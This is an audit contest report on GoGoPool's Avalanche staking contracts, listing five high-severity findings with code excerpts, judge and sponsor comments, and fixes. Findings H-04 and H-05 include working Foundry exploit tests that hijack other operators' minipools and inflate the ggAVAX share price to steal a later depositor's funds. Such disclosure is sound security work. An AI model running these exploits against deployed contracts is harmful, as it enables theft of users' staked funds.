@@ -1,0 +1,224 @@
+[H-01] AVAX Assigned High Water is updated incorrectly
+Submitted byhansfriese, also found byunforgiven,wagmi,betweenETHlines,Allarious,HollaDieWaldfee, andchaduke
+contracts/contract/MinipoolManager.sol#L374
+Node operators can manipulate the assigned high water to be higher than the actual.
+Proof of Concept
+The protocol rewards node operators according to theAVAXAssignedHighWaterthat is the maximum amount assigned to the specific staker during the reward cycle.
+In the functionMinipoolManager.recordStakingStart(), theAVAXAssignedHighWateris updated as below.
+MinipoolManager.sol349:functionrecordStakingStart(350:addressnodeID,351:bytes32txID,352:uint256startTime353: 	)external{354:int256minipoolIndex=onlyValidMultisig(nodeID);355:requireValidStateTransition(minipoolIndex,MinipoolStatus.Staking);356:if(startTime>block.timestamp) {357:revertInvalidStartTime();358: 		}359:360:setUint(keccak256(abi.encodePacked("minipool.item",minipoolIndex,".status")),uint256(MinipoolStatus.Staking));361:setBytes32(keccak256(abi.encodePacked("minipool.item",minipoolIndex,".txID")),txID);362:setUint(keccak256(abi.encodePacked("minipool.item",minipoolIndex,".startTime")),startTime);363:364:// If this is the first of many cycles, set the initialStartTime365:uint256initialStartTime=getUint(keccak256(abi.encodePacked("minipool.item",minipoolIndex,".initialStartTime")));366:if(initialStartTime==0) {367:setUint(keccak256(abi.encodePacked("minipool.item",minipoolIndex,".initialStartTime")),startTime);368: 		}369:370:addressowner=getAddress(keccak256(abi.encodePacked("minipool.item",minipoolIndex,".owner")));371:uint256avaxLiquidStakerAmt=getUint(keccak256(abi.encodePacked("minipool.item",minipoolIndex,".avaxLiquidStakerAmt")));372:Stakingstaking=Staking(getContractAddress("Staking"));373:if(staking.getAVAXAssignedHighWater(owner) <staking.getAVAXAssigned(owner)) {374:staking.increaseAVAXAssignedHighWater(owner,avaxLiquidStakerAmt);//@audit wrong375: 		}376:377:emitMinipoolStatusChanged(nodeID,MinipoolStatus.Staking);378: 	}
+In the line #373, if the current assigned AVAX is greater than the owner’sAVAXAssignedHighWater, it is increased byavaxLiquidStakerAmt.
+But this is supposed to be updated tostaking.getAVAXAssigned(owner)rather than being increased by the amount.
+Example:
+The node operator creates a minipool with 1000AVAX viacreateMinipool(nodeID, 2 weeks, delegationFee, 1000*1e18).On creation, the assigned AVAX for the operator will be 1000AVAX.If the Rialtor callsrecordStakingStart(),AVAXAssignedHighWaterwill be updated to 1000AVAX.
+After the validation finishes, the operator creates another minipool with 1500AVAX this time. Then onrecordStakingStart(),AVAXAssignedHighWaterwill be updated to 2500AVAX by increasing 1500AVAX because the current assigned AVAX is 1500AVAX which is higher than the currentAVAXAssignedHighWater=1000AVAX.This is wrong because the actual highest assigned amount is 1500AVAX.Note thatAVAXAssignedHighWateris reset only through the functioncalculateAndDistributeRewardswhich can be called afterRewardsCycleSeconds=28 days.
+Recommended Mitigation Steps
+Callstaking.resetAVAXAssignedHighWater(owner)instead of callingincreaseAVAXAssignedHighWater().
+MinipoolManager.sol373:if(staking.getAVAXAssignedHighWater(owner) <staking.getAVAXAssigned(owner)) {374:staking.resetAVAXAssignedHighWater(owner);//@audit update to the current AVAX assigned375: 		}
+emersoncloud (GoGoPool) confirmed
+Franfran (warden) commented:
+Can we take some extra considerations here please?Discussed with @0xju1ie (GoGoPool) about this specific issue, and this was the answer:(itis AVAXAssignedHighWater)It increases on a per minipool basis right now, increasing based on only what that single minipool is getting.If it was to just update the AVAXAssignedHighWater to getAVAXAssigned, then it could be assigning the highwater mark too early.EX for how it is now:1. create minipool1, assignedAvax = 1k, high water= 02. create minipool2, assignedAvax =1k, high water = 03. record start for minipool1, highwater -> 1k4.  record start for minipool2, highwater -> 2kEX for how your suggestion could be exploited:1. create minipool1, assignedAvax = 1k, high water= 02. create minipool2, assignedAvax =1k, high water = 03. record start for minipool1, highwater -> 2k4.  cancel minipool2, highwater -> 2kif we used only avax assigned for that case then it would mess up the collateralization ratio for the second minipool and they would only get paid for the minipool that they are currently operating, not the one that ended previously.
+0xju1ie (GoGoPool) commented:
+Their example in the proof of concept section is correct, and we have decided that this is not the ideal behavior and thus this is a bug. However, their recommended mitigation steps would create other issues, as highlighted by what @Franfran said. We intend to solve this issue differently than what they suggested.
+Alex the Entreprenerd (judge) commented:
+The Warden has shown a flaw in the wayincreaseAVAXAssignedHighWateris used, which can be used to:Inflate the amount of AVAXWith the goal of extracting more rewards than intendedI believe that the finding highlights both a way to extract further rewards as well as broken accounting.For this reason I agree with High Severity.
+emersoncloud (GoGoPool) mitigated:
+New variable to track validating avax:multisig-labs/gogopool#25
+Status:Mitigation confirmed with comments. Full details inreport from RaymondFam.
+
+[H-02] ProtocolDAO lacks a method to take out GGP
+Submitted bybin2chen, also found byAkshaySrivastav,hansfriese,hansfriese,caventa,shark,RaymondFam,csanuragjain,rvierdiiev, andcozzetti
+contracts/contract/Staking.sol#L379-L383
+ProtocolDAO implementation does not have a method to take out  GGP. So it can’t handle ggp unless it updates ProtocolDAO.
+Proof of Concept
+recordStakingEnd() will pass the rewards of this reward.“If the validator is failing at their duties, their GGP will be slashed and used to compensate the loss to our Liquid Stakers”
+At this point slashGGP() will be executed and the GGP will be transferred to “ProtocolDAO”
+staking.slashGGP():
+functionslashGGP(addressstakerAddr,uint256ggpAmt)publiconlySpecificRegisteredContract("MinipoolManager", msg.sender) {Vaultvault=Vault(getContractAddress("Vault"));decreaseGGPStake(stakerAddr,ggpAmt);vault.transferToken("ProtocolDAO",ggp,ggpAmt);}
+But the current ProtocolDAO implementation does not have a method to take out  GGP. So it can’t handle ggp unless it updates ProtocolDAO
+Recommended Mitigation Steps
+1.transfer GGP to  ClaimProtocolDAOor2.Similar to ClaimProtocolDAO, add spend method to retrieve GGP
+contractProtocolDAOisBase{...+functionspend(+addressrecipientAddress,+uint256amount+    )externalonlyGuardian{+Vaultvault=Vault(getContractAddress("Vault"));+TokenGGPggpToken=TokenGGP(getContractAddress("TokenGGP"));++if(amount==0||amount>vault.balanceOfToken("ProtocolDAO",ggpToken)) {+revertInvalidAmount();+        }++vault.withdrawToken(recipientAddress,ggpToken,amount);++emitGGPTokensSentByDAOProtocol(address(this),recipientAddress,amount);+   }
+Alex the Entreprenerd (judge) increased severity to High and commented:
+The Warden has shown how, due to a lack ofsweepthe default contract for fee handling will be unable to retrieve tokens sent to it.While the issue definitely would have been discovered fairly early in Prod, the in-scope system makes it clear that the funds would have been sent to ProtocolDAO.sol and would have been lost indefinitely.For this reason, I believe the finding to be of High Severity.
+emersoncloud (GoGoPool) commented:
+Acknowledged.Thanks for the report. This is something we’re aware of and are not going to fix at the moment.The funds are transferred to the Vault and the ProtocolDAO contract is upgradeable. Therefore in the future we can upgrade the contract to spend the Vault GGP tokens to return funds to Liquid Stakers.We expect slashing to be a rare event and might have some manual steps involved in the early days of the protocol to do this process if it occurs.
+
+[H-03] Node operator is getting slashed for full duration even though rewards are distributed based on a 14 day cycle
+Submitted byimmeas, also found byAllarious,ast3ros,unforgiven,Josiah,SmartSek,Franfran,HollaDieWaldfee,RaymondFam, and0xdeadbeef0x
+contracts/contract/MinipoolManager.sol#L673-L675
+A node operator sends in the amount of duration they want to stake for. Behind the scenes Rialto will stake in 14 day cycles and then distribute rewards.
+If a node operator doesn’t have high enough availability and doesn’t get any rewards, the protocol will slash their stakedGGP. For calculating the expected rewards that are missed however, the full duration is used:
+File:MinipoolManager.sol557:functiongetExpectedAVAXRewardsAmt(uint256duration,uint256avaxAmt)publicviewreturns(uint256) {558:ProtocolDAOdao=ProtocolDAO(getContractAddress("ProtocolDAO"));559:uint256rate=dao.getExpectedAVAXRewardsRate();560:return(avaxAmt.mulWadDown(rate) *duration) /365days;// full duration used when calculating expected reward561:	}...670:functionslash(int256index)private{...673:uint256duration=getUint(keccak256(abi.encodePacked("minipool.item",index,".duration")));674:uint256avaxLiquidStakerAmt=getUint(keccak256(abi.encodePacked("minipool.item",index,".avaxLiquidStakerAmt")));675:uint256expectedAVAXRewardsAmt=getExpectedAVAXRewardsAmt(duration,avaxLiquidStakerAmt);// full duration676:uint256slashGGPAmt=calculateGGPSlashAmt(expectedAVAXRewardsAmt);
+This is unfair to the node operator because the expected rewards is from a 14 day cycle.
+Also, If they were to be unavailable again, in a later cycle, they would get slashed for the full duration once again.
+Impact
+A node operator staking for a long time is getting slashed for an unfairly large amount if they aren’t available during a 14 day period.
+The protocol also wants node operators to stake in longer periods:https://multisiglabs.notion.site/Known-Issues-42e2f733daf24893a93ad31100f4cd98
+Team Comment:This can only be taken advantage of when signing up for 2-4 week validation periods.Our protocol is incentivizing nodes to sign up for 3-12 month validation periods.If the team notices this mechanic being abused, Rialto may update its GGP reward calculation to disincentive this behavior.
+This slashing amount calculation incentives the node operator to sign up for the shortest period possible and restake themselves to minimize possible losses.
+Proof of Concept
+Test inMinipoolManager.t.sol:
+functiontestRecordStakingEndWithSlashHighDuration()public{uint256duration=365days;uint256depositAmt=1000ether;uint256avaxAssignmentRequest=1000ether;uint256validationAmt=depositAmt+avaxAssignmentRequest;uint128ggpStakeAmt=200ether;vm.startPrank(nodeOp);ggp.approve(address(staking),MAX_AMT);staking.stakeGGP(ggpStakeAmt);MinipoolManager.Minipoolmemorymp1=createMinipool(depositAmt,avaxAssignmentRequest,duration);vm.stopPrank();addressliqStaker1=getActorWithTokens("liqStaker1",MAX_AMT,MAX_AMT);vm.prank(liqStaker1);ggAVAX.depositAVAX{value:MAX_AMT}();vm.prank(address(rialto));minipoolMgr.claimAndInitiateStaking(mp1.nodeID);bytes32txID=keccak256("txid");vm.prank(address(rialto));minipoolMgr.recordStakingStart(mp1.nodeID,txID,block.timestamp);skip(2weeks);// a two week cyclevm.prank(address(rialto));minipoolMgr.recordStakingEnd{value:validationAmt}(mp1.nodeID,block.timestamp,0ether);assertEq(vault.balanceOf("MinipoolManager"),depositAmt);int256minipoolIndex=minipoolMgr.getIndexOf(mp1.nodeID);MinipoolManager.Minipoolmemorymp1Updated=minipoolMgr.getMinipool(minipoolIndex);assertEq(mp1Updated.status,uint256(MinipoolStatus.Withdrawable));assertEq(mp1Updated.avaxTotalRewardAmt,0);assertTrue(mp1Updated.endTime!=0);assertEq(mp1Updated.avaxNodeOpRewardAmt,0);assertEq(mp1Updated.avaxLiquidStakerRewardAmt,0);assertEq(minipoolMgr.getTotalAVAXLiquidStakerAmt(),0);assertEq(staking.getAVAXAssigned(mp1Updated.owner),0);assertEq(staking.getMinipoolCount(mp1Updated.owner),0);// log slash amountconsole.log("slashedAmount",mp1Updated.ggpSlashAmt);}
+Slashed amount for a365 daysduration is100 eth(10%). However, where they to stake for the minimum time,14 daysthe slashed amount would be only ~3.8 eth.
+Tools Used
+vs code, forge
+Recommended Mitigation Steps
+Either hard code the duration to 14 days for calculating expected rewards or calculate the actual duration usingstartTimeandendTime.
+0xju1ie (GoGoPool) confirmed
+Alex the Entreprenerd (judge) increased severity to High and commented:
+The Warden has shown an incorrect formula that uses thedurationof the pool for slashing.The resulting loss can be up to 26 times the yield that should be made up for.Because the:Math is incorrectBased on intended usageImpact is more than an order of magnitude offPrincipal is impacted (not just loss of yield)I believe the most appropriate severity to be High.
+emersoncloud (GoGoPool) mitigated:
+Base slash on validation period not full duration:multisig-labs/gogopool#41
+Status:Mitigation confirmed byRaymondFamandhansfriese.
+
+[H-04] Hijacking of node operators minipool causes loss of staked funds
+Submitted by0xdeadbeef0x, also found bybin2chen,datapunk,0xmint,Lirios,AkshaySrivastav,adriro,ak1,IllIllI,pauliax,imare,imare,immeas,sces60107,peritoflores,wagmi,Jeiwan,sk8erboy,unforgiven,caventa,yixxas,Franfran,clems4ever,Ch_301,Allarious,0xc0ffEE,0Kage,kaliberpoziomka8552,kaliberpoziomka8552,HollaDieWaldfee,wallstreetvilkas,stealthyz,cozzetti,rvierdiiev,ladboy233,chaduke,chaduke, andManboy
+A malicious actor can hijack a minipool of any node operator that finished the validation period or had an error.
+The impacts:
+Node operators staked funds will be lost (Loss of funds)Hacker can hijack the minipool and retrieve rewards without hosting a node. (Theft of yield)
+2.1 See scenario #2 comment for dependencies
+Proof of Concept
+Background description
+The protocol created a state machine that validates transitions between minipool states. For this exploit it is important to understand three states:
+Prelaunch- This state is the initial state when a minipool is created. The created minipool will have a status ofPrelaunchuntil liquid stakers funds are matched andrialtostakes 2000 AVAX into Avalanche.Withdrawable- This state is set when the 14 days validation period is over. In this state:2.1.rialtoreturned 1000 AVAX to the liquid stakers and handled reward distribution.2.2. Node operators can withdraw their staked funds and rewards.2.3. If the node operator signed up for a duration longer than 14 daysrialtowill recreate the minipool and stake it for another 14 days.Error- This state is set whenrialtohas an issue to stake the funds in Avalanche
+The state machine allows transitions according therequireValidStateTransitionfunction:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L164
+function requireValidStateTransition(int256 minipoolIndex, MinipoolStatus to) private view {------} else if (currentStatus == MinipoolStatus.Withdrawable || currentStatus == MinipoolStatus.Error) {isValid = (to == MinipoolStatus.Finished || to == MinipoolStatus.Prelaunch);} else if (currentStatus == MinipoolStatus.Finished || currentStatus == MinipoolStatus.Canceled) {// Once a node is finished/canceled, if they re-validate they go back to beginning stateisValid = (to == MinipoolStatus.Prelaunch);------
+In the above restrictions, we can see that the following transitions are allowed:
+FromWithdrawablestate toPrelaunchstate. This transition enablesrialtoto callrecreateMinipoolFromFinishedstate toPrelaunchstate. This transition allows a node operator to re-use their nodeID to stake again in the protocol.FromErrorstate toPrelaunchstate. This transition allows a node operator to re-use their nodeID to stake again in the protocol after an error.
+#2 is a needed capability, thereforecreateMinipoolallows overriding a minipool record if:nodeIDalready exists and transition toPrelaunchis permitted
+createMinipool:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L242
+function createMinipool(address nodeID,uint256 duration,uint256 delegationFee,uint256 avaxAssignmentRequest) external payable whenNotPaused {---------// Create or update a minipool record for nodeID// If nodeID exists, only allow overwriting if node is finished or canceled// 		(completed its validation period and all rewards paid and processing is complete)int256 minipoolIndex = getIndexOf(nodeID);if (minipoolIndex != -1) {requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);resetMinipoolData(minipoolIndex);----------setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));----------setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")), msg.sender);----------}
+THE BUG:createMinipoolcan be called byAnyonewith thenodeIDof any node operator.
+IfcreateMinipoolis called at theWithdrawablestate orErrorstate:
+The transaction will be allowedThe owner of the minipool will be switched to the caller.
+Therefore, the minipool is hijacked and the node operator will not be able to withdraw their funds.
+Exploit scenarios
+As shown above, an attacker canalwayshijack the minipool and lock the node operators funds.
+Cancel the minipoolEarn rewards on behalf of original NodeOp
+Scenario #1 - Cancel the minipool
+A hacker can hijack the minipool and immediately cancel the pool after a 14 day period is finished or an error state.
+Results:
+Node operator will lose all his staked AVAX1.1. This can be done by a malicious actor toALLGoGoPool stakers to lose their funds in a period of 14 days.Hacker will not lose anything and not gain anything.
+Consider the following steps:
+Hacker creates a node and creates a minipoolnode-1337.NodeOp registers a nodeIDnode-123and finished the 14 days stake period. State isWithdrawable.Hacker callscreateMinipoolwithnode-123and deposits 1000 AVAX. Hacker is now owner of the minipoolHacker callscancelMinipoolofnode-123and receives his staked 1000 AVAX.NodeOp cannot withdraw his staked AVAX as NodeOp is no longer the owner.Hacker can withdraw staked AVAX for bothnode-1337andnode-123
+The above step #1 isnotnecessary but allow the hacker to immediately cancel the minipool without waiting 5 days.(See other submitted bug #211: “Anti griefing mechanism can be bypassed”)
+┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐│           │               │           │            │           │              │           ││   Rialto  │               │  NodeOp   │            │  Minipool │              │ Hacker    ││           │               │           │            │  Manager  │              │           │└─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘│claimAndInitiate(Node-1337)│                        │createMinipool(Node-1337) ││recordStakingStart(...)    │                        │◄─────────────────────────┤ ┌────────────┐├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  ││                           │                        │                          │ │ 100 GPP    ││                           │createMinipool(Node-123)│                          │ └────────────┘│claimAndInitiate(Node-123) ├───────────────────────►│                          ││recordStakingStart(...)    │                        │                          │├───────────────────────────┼───────────────────────►│                          │┌──────────┐ │                           │                        │                          ││14 days   │ │recordStakingEnd(Node-1337)│                        │                          │└──────────┘ │recordStakingEnd(Node-123) │//STATE: WITHDRAWABLE// │                          │ ┌────────────┐├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  ││                           │                        │createMinipool(Node-123)  │ │Hacker=Owner││                           │                        │◄─────────────────────────┤ └────────────┘│                           │withdrawMinipoolF..(123)│                          ││                           ├───────────────────────►│cancleMinipool(Node-123)  ││                           │       REVERT!          │◄─────────────────────────┤│                           │◄───────────────────────┤      1000 AVAX           ││                           │                        ├─────────────────────────►││                           │   ┌────────────────┐   │withdrawMinipoolFunds(1337│ ┌──────────┐│                           │   │  NodeOp loses  │   │◄─────────────────────────┤ │Withdraw  ││                           │   │  his 1000 AVAX │   │      1000 AVAX + REWARDS │ │stake and ││                           │   │  Stake, cannot │   ├─────────────────────────►│ │rewards   ││                           │   │  withdraw      │   │                          │ └──────────┘│                           │   └────────────────┘   │     ┌───────────────┐    ││                           │                        │     │Hacker loses no│    ││                           │                        │     │funds, can     │    ││                           │                        │     │withdraw GPP   │    ││                           │                        │     └───────────────┘    │
+Scenario #2 - Use node of node operator
+In this scenario the NodeOp registers for a duration longer then 14 days. The hacker will hijack the minipool after 14 days and earn rewards on behalf of the node operators node for the rest of the duration.As the NodeOp registers for a longer period of time, it is likely he will not notice he is not the owner of the minipool and continue to use his node to validate Avalanche.
+Results:
+Node operator will lose all his staked AVAXHacker will gain rewards for staking without hosting a node
+Important to note:
+This scenario is only possible ifrecordStakingEndandrecreateMinipoolarenotcalled in the same transaction byrialto.During the research the sponsor has elaborated that they plan to perform the calls in the same transaction.The sponsor requested to submit issues related torecordStakingEndandrecreateMinipoolsingle/multi transactions for information and clarity anyway.
+Consider the following steps:
+Hacker creates a node and creates a minipoolnode-1337.NodeOp registers a nodeIDnode-123for 28 days duration and finished the 14 days stake period. State isWithdrawable.Hacker callscreateMinipoolwithnode-1234and deposits 1000 AVAX. Hacker is now owner of minipoolRialto callsrecreateMinipoolto restake the minipool in Avalanche. (This time: the owner is the hacker, the hardware is NodeOp)14 days have passed, hacker can withdraw the rewards and 1000 staked AVAXNodeOps cannot withdraw staked AVAX.
+Foundry POC
+The POC will demonstrate scenario #1.
+Add the following test toMinipoolManager.t.sol:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/MinipoolManager.t.sol#L175
+function testHijackMinipool() public {uint256 duration = 2 weeks;uint256 depositAmt = 1000 ether;uint256 avaxAssignmentRequest = 1000 ether;uint256 rewards = 10 ether;uint256 expectedRewards = (rewards/2)+(rewards/2).mulWadDown(dao.getMinipoolNodeCommissionFeePct());uint256 validationAmt = depositAmt + avaxAssignmentRequest;uint128 ggpStakeAmt = 100 ether;address hacker = address(0x1337);// Fund hacker with exact AVAX and gppvm.deal(hacker, depositAmt*2);dealGGP(hacker, ggpStakeAmt);// Fund nodeOp with exact AVAX and gppnodeOp = address(0x123);vm.deal(nodeOp, depositAmt);dealGGP(nodeOp, ggpStakeAmt);// fund ggAVAXaddress lilly = getActorWithTokens("lilly", MAX_AMT, MAX_AMT);vm.prank(lilly);ggAVAX.depositAVAX{value: MAX_AMT}();assertEq(lilly.balance, 0);vm.startPrank(hacker);// Hacker stakes GGPggp.approve(address(staking), ggpStakeAmt);staking.stakeGGP(ggpStakeAmt);// Create minipool for hackerMinipoolManager.Minipool memory hackerMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);vm.stopPrank();vm.startPrank(nodeOp);// nodeOp stakes GGPggp.approve(address(staking), ggpStakeAmt);staking.stakeGGP(ggpStakeAmt);// Create minipool for nodeOpMinipoolManager.Minipool memory nodeOpMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);vm.stopPrank();// Rialto stakes both hackers and nodeOp in avalanchevm.startPrank(address(rialto));minipoolMgr.claimAndInitiateStaking(nodeOpMp.nodeID);minipoolMgr.claimAndInitiateStaking(hackerMp.nodeID);// Update that staking has startedbytes32 txID = keccak256("txid");minipoolMgr.recordStakingStart(nodeOpMp.nodeID, txID, block.timestamp);minipoolMgr.recordStakingStart(hackerMp.nodeID, txID, block.timestamp);// Skip 14 days of staking durationskip(duration);// Update that staking has ended and funds are withdrawableminipoolMgr.recordStakingEnd{value: validationAmt + rewards}(nodeOpMp.nodeID, block.timestamp, 10 ether);minipoolMgr.recordStakingEnd{value: validationAmt + rewards}(hackerMp.nodeID, block.timestamp, 10 ether);vm.stopPrank();/// NOW STATE: WITHDRAWABLE ///vm.startPrank(hacker);// Hacker creates a minipool using nodeID of nodeOp// Hacker is now the owner of nodeOp minipoolminipoolMgr.createMinipool{value: depositAmt}(nodeOpMp.nodeID, duration, 0.02 ether, avaxAssignmentRequest);// Hacker immediatally cancels the nodeOp minipool, validate 1000 AVAX returnedminipoolMgr.cancelMinipool(nodeOpMp.nodeID);assertEq(hacker.balance, depositAmt);// Hacker withdraws his own minipool and receives 1000 AVAX + rewardsminipoolMgr.withdrawMinipoolFunds(hackerMp.nodeID);assertEq(hacker.balance, depositAmt + depositAmt + expectedRewards);// Hacker withdraws his staked ggpstaking.withdrawGGP(ggpStakeAmt);assertEq(ggp.balanceOf(hacker), ggpStakeAmt);vm.stopPrank();vm.startPrank(nodeOp);// NodeOp tries to withdraw his funds from the minipool// Transaction reverts because NodeOp is not the owner anymorevm.expectRevert(MinipoolManager.OnlyOwner.selector);minipoolMgr.withdrawMinipoolFunds(nodeOpMp.nodeID);// NodeOp can still release his staked gppstaking.withdrawGGP(ggpStakeAmt);assertEq(ggp.balanceOf(nodeOp), ggpStakeAmt);vm.stopPrank();}
+To run the POC, execute:
+forge test -m testHijackMinipool -v
+Expected output:
+Running 1 test for test/unit/MinipoolManager.t.sol:MinipoolManagerTest[PASS] testHijackMinipool() (gas: 2346280)Test result: ok. 1 passed; 0 failed; finished in 9.63s
+Tools Used
+VS Code, Foundry
+Recommended Mitigation Steps
+Fortunately, the fix is very simple.The reasoncreateMinipoolis called with an existingnodeIDis to re-use thenodeIDagain with the protocol. GoGoPool can validate that the owner is the same address as the calling address. GoGoPool have already implemented a function that does this:onlyOwner(index).
+Consider placingonlyOwner(index)in the following area:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L243
+function createMinipool(address nodeID,uint256 duration,uint256 delegationFee,uint256 avaxAssignmentRequest) external payable whenNotPaused {----------int256 minipoolIndex = getIndexOf(nodeID);if (minipoolIndex != -1) {onlyOwner(minipoolIndex); // AUDIT: ADDED HERE----------} else {----------}
+Alex the Entreprenerd (judge) commented:
+The Warden has shown how, due to a lax check for State Transition, a Pool ID can be hijacked, causing the loss of the original depositBecause the attack is contingent on a logic flaw and can cause a complete loss of Principal, I agree with High Severity.Separate note: I createdissue 904. For the Finding 2 of this report, please refrain from grouping findings especially when they use different functions and relate to different issues.
+emersoncloud (GoGoPool) mitigated:
+Atomically recreate minipool to not allow hijack:multisig-labs/gogopool#23
+Status:Mitigation confirmed, but a new medium severity issue was found. Full details inreport from hansfriese, and also included in Mitigation Review section below.
+
+[H-05] Inflation of ggAVAX share price by first depositor
+Submitted by0xdeadbeef0x, also found byeierina,ak1,datapunk,0xNazgul,Qeew,Breeje,SamGMK,IllIllI,TomJ,sces60107,WatchDogs,Arbor-Finance,SmartSek,hansfriese,tonisives,peanuts,unforgiven,0xSmartContract,fs0c,ck,0xbepresent,yongskiws,0xLad,btk,rvierdiiev,koxuan,ladboy233,Rolezn,HE1M,yongskiws,SEVEN, anddic0de
+Inflation ofggAVAXshare price can be done by depositing as soon as the vault is created.
+Impact:
+Early depositor will be able steal other depositors fundsExchange rate is inflated. As a result depositors are not able to deposit small funds.
+Proof of Concept
+IfggAVAXis not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share.The depositor can donate WAVAX to the vault and callsyncRewards. This will start inflating the price.
+When the attacker front-runs the creation of the vault, the attacker:
+CallsdepositAVAXto receive 1 shareTransfersWAVAXtoggAVAXCallssyncRewardsto inflate exchange rate
+The issue exists because the exchange rate is calculated as the ratio between thetotalSupplyof shares and thetotalAssets().When the attacker transfersWAVAXand callssyncRewards(), thetotalAssets()increases gradually and therefore the exchange rate also increases.
+convertToShares:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123
+function convertToShares(uint256 assets) public view virtual returns (uint256) {uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());}
+Its important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days.
+This is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).
+syncRewards:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102
+function syncRewards() public {----------// Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.uint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;---------}
+Therefore:
+The closer the call tosyncRewardsis to the next evenly divisible value ofrewardsCycleLength, the closer the nextrewardsCycleEndwill be.The closer the delta betweensyncRewardscalls is, the higher revenue the attacker will get.
+Edge case example:syncRewardsis called with the timestamp 1672876799,syncRewardswill be able to be called again 1 second later.(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800
+Additionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.
+depositAVAX:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166
+function depositAVAX() public payable returns (uint256 shares) {------if ((shares = previewDeposit(assets)) == 0) {revert ZeroShares();}------}
+previewDepositandconvertToShares:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123
+function convertToShares(uint256 assets) public view virtual returns (uint256) {uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());}function previewDeposit(uint256 assets) public view virtual returns (uint256) {return convertToShares(assets);}
+Foundry POC
+The POC will demonstrate the below scenario:
+Bob front-runs the vault creation.Bob deposits 1 WEI of AVAX to the vault.Bob transfers 1000 WAVAX to the vault.Bob callssyncRewardswhen block.timestamp =1672876799.Bob waits 1 second.Bob callssyncRewardsagain. Share price fully inflated.Alice deposits 2000 AVAX to vault.Bob withdraws 1500 AVAX (steals 500 AVAX from Alice).Alice share earns her 1500 AVAX (although she deposited 2000).
+Additionally, the POC will show that depositors trying to deposit less then the donation amount will revert.
+Add the following test toTokenggAVAX.t.sol:https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108
+function testShareInflation() public {uint256 depositAmount = 1;uint256 aliceDeposit = 2000 ether;uint256 donationAmount = 1000 ether;vm.deal(bob, donationAmount  + depositAmount);vm.deal(alice, aliceDeposit);vm.warp(1672876799);// create new ggAVAXggAVAXImpl = new TokenggAVAX();ggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));ggAVAX.initialize(store, ERC20(address(wavax)));// Bob deposits 1 WEI of AVAXvm.prank(bob);ggAVAX.depositAVAX{value: depositAmount}();// Bob transfers 1000 AVAX to vaultvm.startPrank(bob);wavax.deposit{value: donationAmount}();wavax.transfer(address(ggAVAX), donationAmount);vm.stopPrank();// Bob Syncs rewardsggAVAX.syncRewards();// 1 second has passed// This can range between 0-14 days. Every seconds, exchange rate risesskip(1 seconds);// Alice deposits 2000 AVAXvm.prank(alice);ggAVAX.depositAVAX{value: aliceDeposit}();//Expectet revert when any depositor deposits less then 1000 AVAXvm.expectRevert(bytes4(keccak256("ZeroShares()")));ggAVAX.depositAVAX{value: 10 ether}();// Bob withdraws maximum assests for his shareuint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);vm.prank(bob);ggAVAX.withdrawAVAX(maxWithdrawAssets);//Validate bob has withdrawn 1500 AVAXassertEq(bob.balance, 1500 ether);// Alice withdraws maximum assests for her sharemaxWithdrawAssets = ggAVAX.maxWithdraw(alice);ggAVAX.syncRewards(); // to update accountingvm.prank(alice);ggAVAX.withdrawAVAX(maxWithdrawAssets);// Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)assertEq(alice.balance, 1500 ether + 1);}
+To run the POC, execute:
+forge test -m testShareInflation -v
+Expected output:
+Running 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest[PASS] testShareInflation() (gas: 3874399)Test result: ok. 1 passed; 0 failed; finished in 8.71s
+Tools Used
+VS Code, Foundry
+Recommended Mitigation Steps
+When creating the vault add initial funds in order to make it harder to inflate the price.
